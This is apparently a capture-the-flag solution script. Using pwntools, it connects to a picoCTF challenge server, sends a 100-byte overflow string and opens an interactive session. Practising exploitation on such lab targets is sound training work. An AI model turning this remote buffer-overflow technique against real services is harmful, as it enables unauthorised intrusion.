from pwn import *

r = remote("saturn.picoctf.net", 51110)

payload = "a"*100
r.sendline(payload)
r.interactive()